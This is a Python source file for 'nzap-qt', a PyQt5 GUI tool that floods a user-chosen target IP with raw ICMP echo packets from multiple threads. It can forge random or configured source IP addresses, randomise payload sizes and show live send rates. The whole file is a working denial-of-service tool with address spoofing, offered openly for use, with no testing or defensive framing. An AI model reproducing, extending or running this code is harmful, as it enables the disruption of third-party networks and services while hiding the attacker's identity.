import sys
import socket
import struct
import threading
import random
import time
import base64
from datetime import datetime

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, QPushButton,
    QLineEdit, QLabel, QWidget, QCheckBox, QComboBox,
    QTableWidget, QTableWidgetItem, QHeaderView
)
from PyQt5.QtCore import QTimer
from PyQt5.QtGui import QIcon

stop_flag = False
total_packets = 0
total_bytes = 0




#▒██   ██▒    ▄████▄   ██▀███   ▒█████   ▒█████  ▄▄▄█████▓
#▒▒ █ █ ▒░   ▒██▀ ▀█  ▓██ ▒ ██▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒
#░░  █   ░   ▒▓█    ▄ ▓██ ░▄█ ▒▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░
# ░ █ █ ▒    ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░▒██   ██░░ ▓██▓ ░
#▒██▒ ▒██▒   ▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░░ ████▓▒░  ▒██▒ ░
#▒▒ ░ ░▓ ░   ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░
#░░   ░▒ ░     ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░   ░ ▒ ▒░     ░
# ░    ░     ░          ░░   ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░
# ░    ░     ░ ░         ░         ░ ░      ░ ░
#            ░                                  ~ X-Croot





def checksum(data):
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data[:len(data)//2*2]))
    if len(data) % 2:
        s += data[-1] << 8
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def generate_spoof_ip(blocks):
    ip_parts = []
    for b in blocks:
        if "-" in b:
            low, high = map(int, b.split("-"))
            ip_parts.append(str(random.randint(low, high)))
        elif b.lower() == "r":
            ip_parts.append(str(random.randint(1, 254)))
        else:
            ip_parts.append(str(int(b)))
    return ".".join(ip_parts)

def generate_payload(min_size, max_size, mode):
    size = min(random.randint(min_size, max_size), 1400)
    if mode == "base64":
        raw = bytes(random.getrandbits(8) for _ in range(size))
        return base64.b64encode(raw)
    elif mode == "raw":
        return bytes(random.getrandbits(8) for _ in range(size))
    else:
        return b""

def create_icmp_packet(seq, payload):
    header = struct.pack('!BBHHH', 8, 0, 0, 12345, seq)
    packet = header + payload
    chk = checksum(packet)
    return struct.pack('!BBHHH', 8, 0, chk, 12345, seq) + payload

def create_ip_header(src_ip, dst_ip, packet_len, ident):
    ver_ihl = (4 << 4) + 5
    tos = 0
    total_length = packet_len + 20
    ttl = 64
    proto = socket.IPPROTO_ICMP
    checksum_ip = 0
    saddr = socket.inet_aton(src_ip)
    daddr = socket.inet_aton(dst_ip)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ver_ihl, tos, total_length, ident, 0, ttl,
                            proto, checksum_ip, saddr, daddr)
    ip_checksum = checksum(ip_header)
    return struct.pack('!BBHHHBBH4s4s',
                       ver_ihl, tos, total_length, ident, 0, ttl,
                       proto, ip_checksum, saddr, daddr)

class PingThread(threading.Thread):
    def __init__(self, dst_ip, spoof, spoof_blocks, min_size, max_size, payload_mode):
        super().__init__()
        self.dst_ip = dst_ip
        self.spoof = spoof
        self.spoof_blocks = spoof_blocks
        self.min_size = min_size
        self.max_size = max_size
        self.payload_mode = payload_mode
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.seq = 0
        self.running = True

    def run(self):
        global stop_flag, total_packets, total_bytes
        while not stop_flag:
            try:
                src_ip = generate_spoof_ip(self.spoof_blocks) if self.spoof else "192.168.1.20"
                payload = generate_payload(self.min_size, self.max_size, self.payload_mode)
                icmp = create_icmp_packet(self.seq, payload)
                ip = create_ip_header(src_ip, self.dst_ip, len(icmp), self.seq)
                packet = ip + icmp
                self.sock.sendto(packet, (self.dst_ip, 0))
                total_packets += 1
                total_bytes += len(icmp)
                self.seq += 1
            except Exception:
                continue

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.threads = []
        self.init_ui()
        self.timer = QTimer()
        self.timer.timeout.connect(self.update_stats)
        self.load_stylesheet()
        self.setWindowIcon(QIcon("icon.png"))

    def load_stylesheet(self):
        try:
            with open("styles.css", "r") as f:
                self.setStyleSheet(f.read())
        except Exception as e:
            print("Failed to load stylesheet:", e)

    def init_ui(self):
        layout = QVBoxLayout()

        self.dst_ip = QLineEdit("192.168.1.1")
        self.thread_count = QLineEdit("2")
        self.payload_mode = QComboBox()
        self.payload_mode.addItems(["base64", "raw"])
        self.min_size = QLineEdit("32")
        self.max_size = QLineEdit("64")

        self.spoof_checkbox = QCheckBox("Enable IP Spoofing")
        self.spoof1 = QLineEdit("r")
        self.spoof2 = QLineEdit("r")
        self.spoof3 = QLineEdit("r")
        self.spoof4 = QLineEdit("r")

        spoof_layout = QHBoxLayout()
        for w in [self.spoof1, self.spoof2, self.spoof3, self.spoof4]:
            spoof_layout.addWidget(w)

        self.start_btn = QPushButton("[+] Start")
        self.stop_btn = QPushButton("[-] Stop")
        self.start_btn.clicked.connect(self.start_flood)
        self.stop_btn.clicked.connect(self.stop_flood)

        form = QVBoxLayout()
        form.addWidget(QLabel("Target IP:")); form.addWidget(self.dst_ip)
        form.addWidget(QLabel("Thread Count:")); form.addWidget(self.thread_count)
        form.addWidget(QLabel("Payload Type:")); form.addWidget(self.payload_mode)
        form.addWidget(QLabel("Payload Size Range (bytes):"))
        size_layout = QHBoxLayout()
        size_layout.addWidget(QLabel("Min:")); size_layout.addWidget(self.min_size)
        size_layout.addWidget(QLabel("Max:")); size_layout.addWidget(self.max_size)
        form.addLayout(size_layout)
        form.addWidget(self.spoof_checkbox)
        form.addLayout(spoof_layout)
        form.addWidget(self.start_btn)
        form.addWidget(self.stop_btn)

        self.table = QTableWidget(1, 4)
        self.table.setHorizontalHeaderLabels(["Time", "Packets", "Data (KB)", "Speed (KB/s)"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.table.verticalHeader().setVisible(False)
        self.table.setEditTriggers(QTableWidget.NoEditTriggers)

        layout.addLayout(form)
        layout.addWidget(self.table)

        central = QWidget()
        central.setLayout(layout)
        self.setCentralWidget(central)
        self.setWindowTitle("nzap-qt")

    def start_flood(self):
        global stop_flag, total_packets, total_bytes
        stop_flag = False
        total_packets = 0
        total_bytes = 0

        spoof_blocks = [self.spoof1.text(), self.spoof2.text(), self.spoof3.text(), self.spoof4.text()]
        count = int(self.thread_count.text())
        min_size = int(self.min_size.text())
        max_size = int(self.max_size.text())
        mode = self.payload_mode.currentText()

        for _ in range(count):
            thread = PingThread(
                dst_ip=self.dst_ip.text(),
                spoof=self.spoof_checkbox.isChecked(),
                spoof_blocks=spoof_blocks,
                min_size=min_size,
                max_size=max_size,
                payload_mode=mode
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

        self.start_time = time.time()
        self.timer.start(500)

    def stop_flood(self):
        global stop_flag
        stop_flag = True
        for t in self.threads:
            t.join()
        self.threads.clear()
        self.timer.stop()

    def update_stats(self):
        elapsed = time.time() - self.start_time
        kb = total_bytes / 1024
        rate = kb / elapsed if elapsed > 0 else 0
        now = datetime.now().strftime("%H:%M:%S")
        self.table.setItem(0, 0, QTableWidgetItem(now))
        self.table.setItem(0, 1, QTableWidgetItem(str(total_packets)))
        self.table.setItem(0, 2, QTableWidgetItem(f"{kb:.2f}"))
        self.table.setItem(0, 3, QTableWidgetItem(f"{rate:.2f}"))

if __name__ == "__main__":
    if not hasattr(socket, 'AF_INET'):
        print("Raw socket works only on Linux.")
        sys.exit(1)

    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec_())
